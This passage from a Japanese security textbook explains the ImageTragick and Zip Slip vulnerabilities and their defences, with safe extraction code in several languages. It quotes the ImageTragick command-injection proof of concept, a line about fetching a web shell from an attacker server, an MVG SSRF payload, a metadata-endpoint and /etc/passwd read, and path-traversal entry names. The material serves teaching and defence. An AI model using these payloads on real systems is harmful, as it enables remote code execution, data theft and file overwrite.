ImageTragickの本質は一言で言えば、**「画像処理ライブラリが、画像の中身（コンテンツ）から画像形式を自動判定し、しかもその一部の形式（coder）がシェルコマンドを組み立てて外部プログラムを呼び出す際に、ユーザー制御下の文字列を適切にエスケープしていなかった」**という設計・実装両面の欠陥である。この結果、「画像に見えるファイル」をアップロードさせるだけでサーバ上で任意のOSコマンドが実行される（RCE: Remote Code Execution、アプリケーションのプロセスの権限で任意のOSコマンドを実行できてしまう状態）。

### 8.3.2 coderとdelegateの仕組み（原理）

ImageMagickの脆弱性を理解するには、内部の2つの仕組みを知る必要がある。

- **coder**: 特定の画像フォーマット（PNG, JPEG, GIF, PDF, SVG, MVGなど）を読み書きするための内部モジュール。ImageMagickは200種類以上のフォーマットに対応しており、これはPHP-GDやJavaのImageIOが対応する10種類前後と比べて桁違いに多い（MBSDの記事より）。対応フォーマットが多いということは、それだけ「危険な機能を持つcoder」を有効化してしまっている可能性が高いということでもある。
- **delegate**: ImageMagick自身がネイティブに対応していない形式や、外部プログラム（Ghostscript、FFmpegなど）に処理を委譲する必要がある形式を扱うための仕組み。`delegates.xml`という設定ファイルに、「この拡張子・この形式が来たらこの外部コマンドを実行する」というテンプレート文字列が定義されている。

てきとうなメモ（boscono氏のブログ）が指摘する核心はここにある。

> 出典（要旨の引用元）: てきとうなメモ「ImageMagickの脆弱性(ImageTragick)」 — https://boscono.hatenablog.com/entry/2016/05/08/111159

同記事によれば、**「coderが存在しない場合、delegateが外部コマンドを呼び出しますが、この際にシェル特殊文字がエスケープされていないことが主要因」**である。つまりImageMagickは、ユーザーが指定したファイル名やURLをそのままシェルコマンドの文字列に埋め込んでしまい、その中に含まれる `"`、`|`、`` ` `` などのシェルメタ文字（シェルにとって特別な意味を持つ記号。例えば `|` はパイプでコマンドをつなげる記号）をエスケープ（無害化のためにエスケープ文字を付与すること）せずにそのまま `system()` や `popen()` 相当の関数に渡していた。これは典型的な**OSコマンドインジェクション**（外部入力がシェルコマンドの一部として解釈されてしまう脆弱性）のパターンであり、「画像処理」という一見無害な機能の内部に、任意コマンド実行への経路（sink、入力が最終的に危険な処理へ渡される箇所）が埋め込まれていたことになる。

### 8.3.3 実際のペイロード（CVE-2016-3714）

boscono氏のブログに掲載されている、ImageTragick公式PoCそのものの引用は以下の通りである。

```
convert 'https://www.imagemagick.org/image/wizard.png"|ls "-la' wizard.png
```

> 出典: てきとうなメモ「ImageMagickの脆弱性(ImageTragick)」 — https://boscono.hatenablog.com/entry/2016/05/08/111159

この一見奇妙な引数が、なぜコマンド実行につながるのか。`convert`コマンドの第一引数（入力ファイル名として渡される文字列）に `https://` スキームを含むURLが指定されると、ImageMagickの `URL`/`EPHEMERAL`/`HTTPS` 系delegateが呼ばれ、内部的には次のようなコマンドテンプレートが組み立てられる。

```
"curl" -s -k -o "wizard.png" "https://www.imagemagick.org/image/wizard.png"|ls "-la"
```

> 出典: てきとうなメモ「ImageMagickの脆弱性(ImageTragick)」 — https://boscono.hatenablog.com/entry/2016/05/08/111159

これは以下のように分解できる。

1. delegateのテンプレートは本来 `"curl" -s -k -o "%o" "%m:%s"` のような形で、`%m`（スキーム）と `%s`（ファイル名文字列）をそのまま文字列展開してシェルコマンド文字列を作る。
2. 攻撃者が入力ファイル名（＝URL文字列）の中に `"` を含めておくと、curlコマンドの引数を囲む二重引用符が途中で閉じられてしまう。
3. 引用符が閉じた直後に `|ls "-la` を置いておくことで、シェルからは「curlコマンドを実行し、その出力をパイプで`ls -la`に渡す」という**2つの別コマンドが連結された1行**として解釈される。
4. 結果として、`ls -la` という攻撃者指定のコマンドがサーバ上でそのまま実行される。`ls`を任意のシェルコマンド（例えばリバースシェルを張るコマンドや、Webシェルを書き込む `curl攻撃者サーバ/shell.php -o /var/www/html/shell.php`）に置き換えれば、そのままRCEが成立する。

このパターンが成立する根本原因は、「シェル文字列を組み立ててから丸ごと実行する」という実装方式（シェルインジェクションの典型的な温床）と、「入力に対するサニタイズ（無害化処理）が不十分だった」という2点である。ImageMagickは2016年5月3日、この問題を修正した **ImageMagick 7.0.1-1 / 6.9.3-10** をリリースした。

> 出典: ITmedia「ImageMagickに脆弱性」 — https://www.itmedia.co.jp/enterprise/articles/1605/06/news047.html

ITmediaの記事によれば、この脆弱性はRed Hat、SUSE Linux、Ubuntuなど複数のLinuxディストリビューションに影響し、`imagick`（PHP）、`rmagick`・`paperclip`（Ruby）、`imagemagick`（Node.js）といった主要言語のバインディング／周辺ライブラリすべてが間接的に影響を受けるとされた。CERT/CCなどの機関が対応を呼びかけ、セキュリティチームはパッチ公開前から既知の危険性を把握して事前対応を行っていたと報じられている。**このパッチはあくまで2016年5月時点のCVE-2016-3714等への対応であり、その後もImageMagickは形式追加やdelegate拡張のたびに新たな脆弱性を生み続けている点に注意が必要**（後述8.3.5）。

### 8.3.4 拡張子検査だけでは防げない理由——ファイル形式判定の仕組み

ここがImageTragick、ひいてはアップロード脆弱性全般を理解するうえで最も重要な原理である。

ImageMagickは、ファイルの**形式判定を拡張子ではなくファイルの中身（マジックバイト／プレフィックス文字列）で行う**。てきとうなメモの記述を引用する。

> 「ImageMagickはファイルフォーマットをマジックバイト→prefixで判定するため、.png拡張子でもMVG形式なら処理されます。」
> 出典: てきとうなメモ「ImageMagickの脆弱性(ImageTragick)」 — https://boscono.hatenablog.com/entry/2016/05/08/111159

つまり、拡張子が `.png` や `.jpg` であっても、ファイルの中身の先頭が別形式（例えばMVGやSVGのテキスト構文）として解釈できれば、ImageMagickはその内容に従って処理してしまう。これにより、「アプリケーション側で拡張子を `.png` `.jpg` に制限しているから安全」という素朴な対策は、ImageMagickに対しては無力になる。

この性質を悪用する代表例が **MVG（Magick Vector Graphics）** や **SVG** を使った外部URL参照（**SSRF**: Server-Side Request Forgery、サーバに攻撃者が指定した任意の宛先へリクエストを送らせる攻撃）である。てきとうなメモに掲載されている例を引用する。

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg)'
```

> 出典: てきとうなメモ「ImageMagickの脆弱性(ImageTragick)」 — https://boscono.hatenablog.com/entry/2016/05/08/111159

このテキストファイルを `.png` の拡張子で保存してアップロードしても、ImageMagickはマジックバイト判定によってこれをMVG形式と認識し、`fill`プロパティに指定された`url(...)`を取得しようとする。この挙動を使うと、以下のような攻撃が成立しうる。

- サーバに、攻撃者が制御する外部サーバや、クラウド環境のメタデータエンドポイント（例: `http://169.254.169.254/...`）へのリクエストを送らせるSSRF
- ローカルファイルパスを`url()`に指定することによる**ローカルファイル読み取り**（`label:@/etc/passwd` のような疑似プロトコルを使う手口も知られている）

MBSD記事はRuby on Rails + CarrierWaveという実務でよく使われる構成に即して、この「入力形式と出力形式を攻撃者が実質的に選べてしまう」問題を具体的に解説している。

> 「IMが画像の中身と拡張子から入力の形式を推定します。中身が優先」「変換先の形式は拡張子から決定するので、この例ではPNG」
> 出典: MBSD「ImageMagickを使うWebアプリのセキュリティ 1」 — https://www.mbsd.jp/research/20180831/imagemagick1/

CarrierWaveのようなアップロードライブラリでは、入力形式はImageMagickの中身判定に委ねられ、出力形式（変換後のフォーマット）はアップロード時の拡張子から決められる。この非対称性により、攻撃者は「中身はMVGやMSL（Magick Scripting Language、ImageMagick独自のXMLベーススクリプト形式）だが拡張子は`.png`」というファイルを送り込むだけで、実質的に任意の入力形式を選択できてしまう。

さらにMBSD記事は、RCEに至らない場合でも**情報漏洩**が起きる実例を示している。例えば拡張子を`.info`にして変換させると、出力結果の先頭に「サーバ上の一時ファイルの絶対パス（Railsのプロジェクトディレクトリを含む）」が含まれ、`.eps3`では「IMのバージョン情報」まで出力に混入した、という具体的な確認結果が報告されている。

> 出典: MBSD「ImageMagickを使うWebアプリのセキュリティ 1」 — https://www.mbsd.jp/research/20180831/imagemagick1/

これは診断の実務上も重要な示唆で、RCEが成立しなくても、変換結果に**パス情報やバージョン情報が漏れる**だけで攻撃者にとって有益な偵察情報（サーバのディレクトリ構成、稼働しているImageMagickのバージョン＝既知のCVEの適用可否判断材料）になる。

### 8.3.5 「パッチを当てれば終わり」ではない理由

MBSD記事が強調している数値は非常に示唆的である。

> 「2017年は357個、2018年は32個のCVEが公開」
> 出典: MBSD「ImageMagickを使うWebアプリのセキュリティ 1」 — https://www.mbsd.jp/research/20180831/imagemagick1/

ImageTragick（CVE-2016-3714）はあくまで2016年に発覚した「最初の大きな一件」に過ぎず、その後もMSL形式（CVE-2017-17934）、PNG形式（CVE-2017-17914ほか複数）、SVG、PDF、PostScript形式など、対応フォーマットが多いこと自体が原因で新たな脆弱性が継続的に発見・修正され続けている。ImageMagick本家のリリースサイクルは短く、月に数回のリリースがあるとされ、「常に最新版を追従していれば安全」という単純な運用は現実的に困難である。

したがって防御側は、**個別のCVEパッチ適用だけに依存せず、そもそも危険な機能を無効化する「多層防御」**の発想を取る必要がある。次節でこれを具体的に示す。

### 8.3.6 対策：policy.xmlによる機能制限

ImageMagickにはセキュリティポリシーファイル `policy.xml` が用意されており、coderやdelegateを個別に無効化できる。てきとうなメモは以下のような設定例を示している。

```xml
<policy domain="coder" rights="none" pattern="MVG" />
<policy domain="coder" rights="none" pattern="EPHEMERAL" />
```

> 出典: てきとうなメモ「ImageMagickの脆弱性(ImageTragick)」 — https://boscono.hatenablog.com/entry/2016/05/08/111159

MBSD記事はさらに踏み込んだ、より安全側に倒した設定例を示している。

```xml
<policy domain="delegate" rights="none" pattern="*" />
<policy domain="filter" rights="none" pattern="*" />
<policy domain="coder" rights="none" pattern="*" />
<policy domain="coder" rights="read | write" pattern="{JPEG,GIF,PNG}" />
```

> 出典: MBSD「ImageMagickを使うWebアプリのセキュリティ 1」 — https://www.mbsd.jp/research/20180831/imagemagick1/

これは「すべてのdelegateとfilterを無効化し、coder（画像のエンコード/デコードを行うモジュール）は JPEG・GIF・PNG の3種類だけを許可する」という、**ホワイトリスト方式**の設定である。順に上から評価され、後に書いたルールが優先されるため、まず全体を`none`（禁止）にしてから、必要な3形式だけを個別に許可する、という順序が重要になる。この方式であれば、たとえ新たなCVEが発見されても、影響を受けるcoderがそもそも無効化されていれば実害には至らない可能性が高い。MBSD記事によれば、この設定はImageMagick 7.0.4-7以降、6.9.7-7以降で利用可能とされている（利用しているバージョンで`policy.xml`の記法がサポートされているか確認すること）。

`policy.xml`は通常 `/etc/ImageMagick-6/policy.xml` や `/etc/ImageMagick-7/policy.xml` のようなパスに配置される。コンテナイメージでImageMagickを利用する場合は、Dockerfileでこのファイルを上書きするか、ビルド後に設定を反映させることで、アプリケーションコードを変更せずにポリシーを強制できる。

### 8.3.7 対策：入力段階での検証（プログラムレベル）

policy.xmlによる制限はImageMagick自体への防御だが、加えてアプリケーション側（ImageMagickを呼び出す前段）でもファイル形式を検証すべきである。MBSD記事はRubyでの実装例を紹介している。

```ruby
def check_image(file)
  ext = File.extname(file.original_filename).downcase
  data = file.read(20)

  return ext == '.gif' && data.match(/\AGIF8[79]a/) ||
    ext == '.png' && data.match(/\A\x89PNG\r\n\x1A\n/) ||
    ['.jpg','.jpeg'].include?(ext) && data.match(/\A\xFF\xD8\xFF/)
end
```

> 出典: MBSD「ImageMagickを使うWebアプリのセキュリティ 1」 — https://www.mbsd.jp/research/20180831/imagemagick1/

この関数のポイントは、**拡張子とマジックバイトの両方が期待する形式と一致することを要求する**点である。拡張子だけの確認（`.png`かどうか）や、マジックバイトだけの確認では不十分で、8.3.4節で述べた「拡張子は`.png`だが中身はMVG」という攻撃パターンを弾くには、両方が矛盾なく一致していることを確認する必要がある。MBSD記事は「チェックをIMに渡す前のタイミングでこのプログラムを実行させて画像形式を絞ってしまいたい」ため、Controller層（リクエストを受け取ってImageMagickの呼び出しに渡すより前の層）での実装を推奨している。これはImageMagick自体のpolicy設定と組み合わせる「多層防御」の一環であり、片方だけに頼らないことが重要である。

### 8.3.8 対策：サンドボックス化（隔離実行環境）

MBSD記事はさらに、Googleが開発した軽量サンドボックスツール **nsjail** を使ってImageMagickの実行そのものを隔離する手法も紹介している。

```ruby
MiniMagick.cli_path = "/opt/jailed-im"
```

> 出典: MBSD「ImageMagickを使うWebアプリのセキュリティ 1」 — https://www.mbsd.jp/research/20180831/imagemagick1/

nsjailは「ファイルアクセス、ネットワークアクセス、システムコール、リソース量などを制限した、仮想的な隔離環境」を構築するツールであり、たとえコマンドインジェクションやSSRFが成立しても、その被害範囲をサンドボックス内に閉じ込めることを狙う。ただし記事は運用上の注意点も挙げている。

- Debian系OSでの動作を前提としており、CentOS系では完全には動作しない場合がある
- 隔離処理を挟むことによる性能面でのペナルティ（オーバーヘッド）が発生する
- ImageMagickをアップデートする際にサンドボックスの設定（許可するシステムコールやファイルパスなど）も合わせて見直す必要がある

サンドボックス化は「最後の砦」としては有効だが、運用コストが高いため、まずはpolicy.xmlによる機能制限とアプリケーション側の入力検証を優先し、より高いセキュリティ要件を持つ環境（マルチテナントSaaSなど、信頼できない第三者が任意の画像をアップロードする環境）で追加的に検討するのが現実的である。

### 8.3.9 まとめ：多層防御の設計指針

ImageTragickの事例から得られる教訓を整理すると、以下のようになる。

1. **画像処理ライブラリは、対応形式が多いほど攻撃面（attack surface、攻撃者が入力を送り込める経路の総体）が広い。** ImageMagickの200種類以上のフォーマット対応は利便性と引き換えに大きなリスクを抱えている。
2. **拡張子ベースの検証は、中身ベースで形式判定を行うライブラリに対しては無力である。** 拡張子とマジックバイトの両方を検証し、両者が一致することを確認する。
3. **ライブラリ内部で外部コマンドを組み立てて実行する仕組み（delegate）がある場合、シェルメタ文字のエスケープ漏れが常にRCEの温床になりうる。** これはImageMagickに限らず、外部プログラムを`system()`的に呼び出す設計全般に共通するリスクである。
4. **CVE修正への追従だけでなく、危険な機能（不要なcoder・delegate）自体を無効化するホワイトリスト方式のポリシー設定を行う。** 新規脆弱性が発見されても影響を局所化できる。
5. **可能であればサンドボックス等でプロセスそのものを隔離し、万一の突破時の被害範囲を限定する。**

これらは本書の他章で扱うファイルアップロード対策の原則（拡張子・MIME・マジックバイトの多重検証、実行不可能な保存領域、最小権限での処理プロセス実行）とも一致しており、ImageTragickは「アップロードされたファイルを処理するライブラリ自体が新たな攻撃対象になりうる」ことを示す代表的な事例として押さえておきたい。

なお、本節で紹介したペイロードや設定例は、防御目的の理解のために原典から引用したものであり、実在のサービスや本番環境に対してこれらの手法を無許可で試すことは決して行ってはならない。検証を行う場合は、自身が管理する隔離されたテスト環境（ローカルのDockerコンテナ等）に限定すること。

## Zip Slip脆弱性

### この節のねらい

ファイルアップロードの受け口として「ZIP / TAR などの圧縮アーカイブを受け取り、サーバ側で展開する」機能は非常に多い。プラグインの導入、テーマの取り込み、バックアップの復元、Dockerイメージやパッケージの取り扱いなど、用途は幅広い。ところが、アーカイブの「展開（extract / unzip）」処理は、実装者が思っている以上に危険な操作である。

**Zip Slip（ジップ・スリップ）** は、悪意あるアーカイブに含まれるエントリ名（アーカイブ内のファイルのパス）に `../` のようなディレクトリトラバーサル（親ディレクトリへ遡る相対パス）を仕込むことで、**本来の展開先ディレクトリの外へ任意のファイルを書き込ませる**脆弱性である。書き込み先を実行可能ファイルや設定ファイルに向ければ、最終的に**リモートコード実行（RCE: 攻撃者の任意コマンドをサーバ上で走らせること）**に発展しうる、極めて影響の大きい欠陥だ。

セキュリティ企業 Snyk が 2018年6月5日 に「Zip Slip」という名前を付けて公開し、Oracle、Amazon、Spring/Pivotal、LinkedIn、Twitter、Alibaba、Jenkins、Eclipse、OWASP、SonarQube、Google など、数千のプロジェクト・ライブラリに影響することが判明した。本節では、なぜこの脆弱性が「展開処理の仕組み」から必然的に生まれるのかを、パス結合の内部挙動レベルで解き明かし、防御コードの原理まで踏み込む。

> 本テキストは防御目的で記述する。実在サービスや本番環境への無許可の検証、破壊的手順は扱わない。以下のコードは、自分が管理する検証環境で脆弱性の原理と修正を理解するための最小例である。

---

### Zip Slipとは何か

まず用語を整理する。

- **アーカイブ**: 複数のファイルを1つにまとめた入れ物。ZIP、TAR、JAR、WAR、CPIO、APK、RAR、7z などが該当する。それぞれの内部には「エントリ（entry）」が並び、各エントリは**エントリ名（＝そのファイルの相対パス）**と中身のデータを持つ。
- **エントリ名**: 例えば `docs/readme.txt` のような、展開時にどのパスへ書き出すかを示す文字列。ここが攻撃の入口になる。

Zip Slip の本質は次の一言に集約される。

> **アーカイブのエントリ名を、展開先ディレクトリのパスと素朴に連結し、連結結果をそのまま書き込み先として使ってしまう。**

エントリ名に `../../../../tmp/evil.sh` のような値が入っていると、連結結果は展開先の外を指す。攻撃者はアーカイブを作る側なので、エントリ名は完全に攻撃者の制御下にある。つまりこれは**「攻撃者が完全に制御する入力（エントリ名）が、ファイルの書き込み先という危険な代入先（sink: 入力が最終的に実行・解釈される到達点）に、検証なしで流れ込む」**という、典型的なインジェクション構造である。

Snyk の分類では、これは **arbitrary file overwrite（任意ファイル上書き）** に分類される critical 級の脆弱性であり、「典型的に RCE へつながる」とされている。

> 出典: Zip Slip Vulnerability — Snyk Research — https://security.snyk.io/research/zip-slip-vulnerability

---

### なぜ起きるのか：パス連結の内部挙動

Zip Slip は「ライブラリの珍しいバグ」ではなく、**パス連結という基本APIの素直な仕様**から生まれる。ここが理解の核心なので、仕組みレベルで丁寧に見る。

#### Javaの `new File(dir, name)` の挙動

Java の代表的な脆弱パターンは次のとおりである（Snyk の解説より）。

```java
Enumeration<ZipEntry> entries = zip.getEntries();
while (entries.hasMoreElements()) {
   ZipEntry e = entries.nextElement();
   File f = new File(destinationDir, e.getName());   // ★ここが問題
   InputStream input = zip.getInputStream(e);
   IOUtils.copy(input, write(f));                     // fへ書き込み
}
```

問題は `new File(destinationDir, e.getName())` の一行だ。`java.io.File` の「親ディレクトリ + 子パス」コンストラクタは、単に文字列としてパスを連結し、`File` オブジェクトを作るだけである。**このコンストラクタは相対パスの `..` を解決（正規化）しない**。つまり `..` が入っていても弾かず、警告もしない。

具体的に、`destinationDir` が `/var/app/uploads/unzip` で、エントリ名が `../../../../../../tmp/evil.sh` の場合を考える。

```
連結直後（未正規化）: /var/app/uploads/unzip/../../../../../../tmp/evil.sh
```

この文字列を実際にファイルシステムがオープンするとき、OS はパス中の `..` を「1つ上のディレクトリ」として解釈する。`..` を6段遡ると `/var/app/uploads/unzip` を突き抜けてルート付近まで戻り、最終的な実体パスは次のようになる。

```
実際に書き込まれる場所: /tmp/evil.sh
```

つまり、`FileOutputStream` などで書き込む段階で OS がパスを解決した結果、**展開先ディレクトリの完全に外側**にファイルが作られる。`new File` のコンストラクタは何も検証しないため、開発者は「`destinationDir` の下に書いている」と思い込んでいるのに、実際にはどこへでも書けてしまう。これが Zip Slip の一次原理である。

Snyk の技術白書に載る、より低レベルの脆弱コードでも同じ構造が現れる。

```java
ZipInputStream zis = new ZipInputStream(new FileInputStream("archive.zip"));
ZipEntry entry;
while ((entry = zis.getNextEntry()) != null) {
    String entryName = entry.getName();
    File file = new File(destination, entryName);  // 検証なしの連結
    FileOutputStream fos = new FileOutputStream(file); // 展開先の外へ書ける
}
```

> 出典: Zip Slip — Technical Whitepaper (PDF) — Snyk — https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf

#### なぜ「絶対パス」も危険なのか

`..` による相対トラバーサルだけでなく、**エントリ名が絶対パス**（例: `/etc/cron.d/backdoor` や Windows の `C:\Windows\...`）である場合も危険だ。多くの言語のパス結合APIは、「2番目の引数が絶対パスなら1番目を無視して2番目を採用する」という仕様を持つ。例えば Node.js の `path.join('/dest', '/etc/passwd')` は `/etc/passwd` を返さないが、`path.resolve('/dest', '/etc/passwd')` は `/etc/passwd` を返す。実装によっては絶対パスがそのまま採用され、展開先が完全に無視される。したがって防御では「`..` を含むか」だけでなく「絶対パスでないか」も考慮する必要がある。

#### 攻撃の二段構え

Snyk は Zip Slip を「2つの要素が組み合わさって成立する」と説明する。

1. **悪意あるアーカイブの作成**: 攻撃者が、トラバーサル入りのエントリ名を持つアーカイブを用意する。通常のZIPツールは `..` 入りの名前を作りにくいので、攻撃者は生のAPIやスクリプトでアーカイブを直接生成する。
2. **検証を欠いた展開コード**: 受け取り側が、エントリ名を正規化・検証せずに書き込み先へ使う。

このどちらか一方でも欠ければ攻撃は成立しない。逆に言えば、**展開側で正しく検証すれば防げる**——修正の責任は基本的に「アーカイブを展開する側」にある。

なお、白書ではトラバーサルに加えて**シンボリックリンク（symlink）を使う変種**にも触れている。アーカイブ内に「外部を指すsymlink」を含め、その後に「そのsymlink経由のパス」へ書き込むエントリを置くことで、正規化チェックをすり抜けて外部へ書く手法である。防御でパスを解決する際に「symlinkを辿った後の実体パス」で判定すべき理由がここにある（Javaの `getCanonicalPath()` は symlink を解決する点が重要）。

---

### 影響を受けるアーカイブ形式とエコシステム

Zip Slip は ZIP に限らない。エントリ名という概念を持つアーカイブ全般に及ぶ。

- **対象形式**: tar, jar, war, cpio, apk, rar, 7z（そして最も一般的な zip）。
- **最も影響が大きい言語**: Java。理由は、Javaには「アーカイブ展開を安全に一元処理する標準の高水準ライブラリ」が存在せず、各プロジェクトが `java.util.zip` や `commons-compress` を使って**手書きの展開ループ**を書くため。Stack Overflow などに出回った脆弱なスニペットがコピーされ、被害が拡散した。
- **他に影響**: JavaScript、.NET、Go、Ruby など。

Snyk の GitHub リポジトリ（`snyk/zip-slip-vulnerability`）には、影響ライブラリと修正状況が整理されている。主なものを挙げる（2018年公開時点、CVE付きで修正済みのもの）。

| 言語 | ライブラリ | 修正バージョン | CVE |
|------|-----------|---------------|-----|
| JavaScript | unzipper | 0.8.13 | CVE-2018-1002203 |
| JavaScript | adm-zip | 0.4.9 | CVE-2018-1002204 |
| Java | plexus-archiver | 3.6.0 | CVE-2018-1002200 |
| Java | zt-zip | 1.13 | CVE-2018-1002201 |
| Java | zip4j | 1.3.3 | CVE-2018-1002202 |
| .NET | DotNetZip.Semverd | 1.11.0 | CVE-2018-1002205 |
| .NET | SharpCompress | 0.21.0 | CVE-2018-1002206 |
| .NET | SharpZipLib | 1.0.0 | CVE-2018-1002208 |
| C++/Qt | quazip | 0.7.6 | CVE-2018-1002209 |
| PHP | chumper/zipper | 1.0.3 | N/A |
| Ruby | rubyzip | （最新へ） | CVE-2018-1000544 |

重要な注意点として、**「高水準APIが無く、脆弱なパターンが利用者側に残り続ける」もの**がある。これらはライブラリ自体を直せば済むのではなく、**使う側が毎回自分で検証を書かねばならない**。

- Java: `java.util.zip`, `commons-compress`
- Go: 標準の `archive` パッケージ（`archive/zip`, `archive/tar`）
- Ruby: zip-ruby, zipruby
- Python: `tarfile`（後述のとおり後年に既定挙動が強化された）
- Rust: rs-async-zip

また Go のいくつかのライブラリ（cae/zip: CVE-2020-7664、cae/tz: CVE-2020-7668）は、公開後しばらく未修正のまま残っていた点も記録されている。

> 出典: snyk/zip-slip-vulnerability — GitHub — https://github.com/snyk/zip-slip-vulnerability

---

### 攻撃が成立するとどうなるか

任意の場所へファイルを書けると、攻撃者は多様な悪用ができる。

- **実行ファイルの上書きによるRCE**: 起動スクリプト、cronジョブ（`/etc/cron.d/`）、Webアプリのデプロイ先（`.jsp`/`.php`/`.aspx` など）、`~/.bashrc`、systemdユニットなどを上書き・設置し、後で実行させることで任意コマンド実行に至る。
- **設定ファイルの破壊・改ざん**: 認証設定や許可リストを書き換え、権限昇格やバイパスにつなげる。
- **クライアント側の被害**: サーバだけでなく、ユーザーの端末でアーカイブを展開するデスクトップアプリやビルドツールでも成立し、ローカルファイルを汚染しうる。

要は「どこへでも1バイト書ける」時点で、環境次第でRCEまで一直線になりうる。だからこそ Snyk は critical と位置づけた。

---

### 防御：正規化してから境界内かを検証する

修正の原理はシンプルで、言語を問わず共通である。

> **エントリ名を展開先と連結したら、その結果を「正規化（canonicalize）」し、正規化後のパスが「展開先ディレクトリの内側」に収まっていることを、書き込みの前に必ず確認する。収まっていなければ拒否する。**

「正規化」とは、`..` や `.`、symlink を解決して、そのパスが実際に指す一意な絶対パス（**canonical path**）を求めることである。正規化してから比較しないと、`../` を含んだままの文字列比較になり、判定が破られる。

#### Javaの安全な実装（Snyk推奨パターン）

Snyk が推奨する定番の修正は、エントリごとに「安全な `File` を返すヘルパー」を挟む方法だ。

```java
public File newFile(File destinationDir, ZipEntry zipEntry) throws IOException {
    File destFile = new File(destinationDir, zipEntry.getName());

    String destDirPath  = destinationDir.getCanonicalPath(); // 展開先の正規パス
    String destFilePath = destFile.getCanonicalPath();       // 書き込み先の正規パス（..やsymlink解決後）

    // 「展開先パス + セパレータ」で始まっていなければ、外へ出ている＝拒否
    if (!destFilePath.startsWith(destDirPath + File.separator)) {
        throw new IOException("Entry is outside of the target dir: " + zipEntry.getName());
    }
    return destFile;
}
```

**なぜこれで防げるのか**を分解する。

1. `getCanonicalPath()` は `..`・`.`・シンボリックリンクをすべて解決し、その `File` が最終的に指す実体の絶対パスを返す。したがって `../../../../tmp/evil.sh` は `/tmp/evil.sh` に、symlink 経由の細工も辿った先の実体に化ける。**検証対象を「見かけの文字列」ではなく「実際に書かれる場所」に揃える**のがポイント。
2. その実体パスが `destDirPath + File.separator`（例: `/var/app/uploads/unzip/`）で始まるかを確認する。始まっていれば展開先の内側、始まっていなければ外側だ。外側なら例外を投げて展開を中止する。
3. **`File.separator` を付けて比較する理由**が重要だ。もし単に `destDirPath` で `startsWith` すると、`/var/app/uploads/unzip` という展開先に対し `/var/app/uploads/unzip-evil/...` のような**兄弟ディレクトリ**が「前方一致」してしまい、すり抜ける（プレフィックス誤判定）。末尾にセパレータを付けることで「このディレクトリの直下（配下）」だけを許可でき、名前が似た隣接ディレクトリを弾ける。

この `newFile()` を展開ループから呼び、返ってきた `File` にだけ書き込むようにすれば安全になる。

```java
File destDir = new File(destination).getCanonicalFile();
ZipEntry entry;
while ((entry = zis.getNextEntry()) != null) {
    File target = newFile(destDir, entry);   // 検証込み。外を指すなら例外で中断
    // entry がディレクトリなら mkdirs、ファイルなら親を作ってから書き込む
    // ...target へ安全に書き出す...
}
```

> 出典: Zip Slip — Technical Whitepaper (PDF) — Snyk — https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf

#### 他言語での同じ原理

言語が変わっても「正規化 → 境界内チェック」という骨格は同じである。以下は原理を示す最小例で、実運用ではセパレータ境界の扱い（前項の `File.separator` 相当）を必ず入れること。

**Node.js / JavaScript**

```javascript
const path = require('path');

const destResolved = path.resolve(destination);
const resolvedPath = path.resolve(destination, entry.name);

// 「展開先 + パス区切り」で始まるか、または展開先そのものかを確認
if (resolvedPath !== destResolved &&
    !resolvedPath.startsWith(destResolved + path.sep)) {
    throw new Error('Path traversal detected: ' + entry.name);
}
```

`path.resolve()` は絶対パス化と `..` の解決を行う。前述のとおり、エントリ名が絶対パスなら `path.resolve` はそれを採用してしまうため、この検証で `destResolved` 配下に収まらず弾かれる——絶対パス攻撃にも効く点が利点だ。

**Go**

```go
destAbs, _ := filepath.Abs(destination)
entryPath := filepath.Join(destination, entry.Name) // Joinは..をCleanで正規化する
absPath, _ := filepath.Abs(entryPath)

if absPath != destAbs &&
    !strings.HasPrefix(absPath, destAbs+string(os.PathSeparator)) {
    // 展開先の外 → 拒否
}
```

Go の `filepath.Join` は内部で `filepath.Clean` を呼び `..` を畳み込むが、それでも「畳み込んだ結果が外を指す」ケースがあるため、**Abs化した上での前方一致チェックは必須**である。

**.NET**

```csharp
string fullDestination = Path.GetFullPath(destination);
string fullPath = Path.GetFullPath(Path.Combine(destination, entry.Name));

if (!fullPath.StartsWith(
        fullDestination.EndsWith(Path.DirectorySeparatorChar.ToString())
            ? fullDestination
            : fullDestination + Path.DirectorySeparatorChar)) {
    throw new Exception("Path traversal detected");
}
```

`Path.GetFullPath` が正規化を担う。ここでもディレクトリ区切りを付けた前方一致にするのが、兄弟ディレクトリ誤判定を防ぐ要点だ。

#### Python `tarfile` の注意とバージョン事情

Python の `tarfile` は歴史的に Zip Slip に相当する挙動（`extractall` がトラバーサルや絶対パスを検証しない）を持ち、長らく利用者側の対策が必要だった（この問題は CVE-2007-4559 として古くから知られていた）。**Python 3.12 以降**では `tarfile.extractall()` / `extract()` に `filter` 引数が追加され、`filter='data'` を指定すると、絶対パスや `..` を含む危険なエントリを拒否する安全なフィルタが適用される。将来的には安全側がデフォルトになる方針が示されている。したがって新しいコードでは次のように明示する。

```python
import tarfile

with tarfile.open("archive.tar") as tar:
    tar.extractall(path=destination, filter="data")  # 危険なメンバーを拒否
```

古い Python では `filter` が使えないため、各メンバーについて自前で正規化・境界チェックを行う必要がある。

> ⚠️ **バージョン依存の注意**: 上記の `tarfile` の `filter` は Python 3.12（2023年）で導入された挙動である。対象環境のバージョンによって既定の安全性が異なるため、実装時は必ずランタイムのバージョンと当該ライブラリの現行仕様を確認すること。

---

### 実装時のチェックリスト（防御のまとめ）

Zip Slip を確実に潰すための実務ポイントを整理する。

1. **正規化してから検証する**: 見かけの文字列でなく、`..`・`.`・symlink を解決した canonical / absolute path で判定する（Javaは `getCanonicalPath()`、Nodeは `path.resolve`、.NETは `Path.GetFullPath`、Goは `filepath.Abs`）。
2. **ディレクトリ区切りを付けた前方一致**: `destDir + separator` で始まるかを確認し、名前が似た兄弟ディレクトリのすり抜けを防ぐ。
3. **絶対パスも拒否**: エントリ名が絶対パスのケースを検証で確実に弾く（正規化＋境界チェックで自然に弾ける）。
4. **symlinkエントリを警戒**: symlink を含むアーカイブは、その後の書き込みが外部を指しうる。信頼できない入力では symlink エントリ自体を拒否するのが安全。
5. **書き込み前に中断**: 検証で外部を指すと判明したら、そのエントリだけ飛ばすのでなく展開全体を中止する設計が堅い（悪意あるアーカイブと判断できるため）。
